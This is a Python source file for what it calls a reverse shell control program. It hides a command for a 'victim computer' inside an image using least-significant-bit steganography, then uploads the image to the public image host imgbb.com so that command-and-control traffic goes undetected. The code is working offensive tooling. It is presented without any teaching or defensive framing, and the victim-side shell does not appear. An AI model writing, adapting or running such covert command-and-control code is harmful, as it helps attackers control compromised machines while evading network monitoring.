from stegano import lsb
import click
import os
import requests
import base64

@click.command()
@click.argument("carrier", type=click.Path(exists=True))#, help="Image file to carry the payload.")
@click.argument("payload", nargs=-1)
@click.option("-n", "--name", default="secret", help="Name of payload image file.", show_default=True)
@click.option("-o", "--offline", is_flag=True, default=False, help="Create payload file, but don't upload it anywhere. For local use or use with a USB drive.")
def command(carrier, payload, name, offline):
    """
    Reverse shell control program that sends command and control payloads hidden in images using steganography techniques to keep network traffic undetected. 
    
    \b
    Arguments:
        CARRIER: Image file to carry the payload
        PAYLOAD: Command to be run by reverse shell on victim computer
    """
    SECRET_PATH = os.path.dirname(__file__) + "\\" + name + ".PNG"

    #Hide payload in carrer image and save new payload image as [name].PNG, default=secret.PNG
    secret = lsb.hide(carrier, payload[0])
    secret.save(SECRET_PATH)

    if(not offline):
        key = input("Please input your imgbb.com API key, or run the code with the --offline option to only save the payload file locally: ")

        with open(SECRET_PATH, "rb") as file:
            #Upload payload image to imgbb
            url = "https://api.imgbb.com/1/upload"
            request = {
                "key": key,
                "image": base64.b64encode(file.read()),
            }
            try:
                res = requests.post(url, request)
                print("Success!")

            except requests.exceptions.RequestException as e:
                raise SystemExit(e)
    else:
        print("Success! Saved: " + SECRET_PATH)

if __name__ == '__main__':
    command()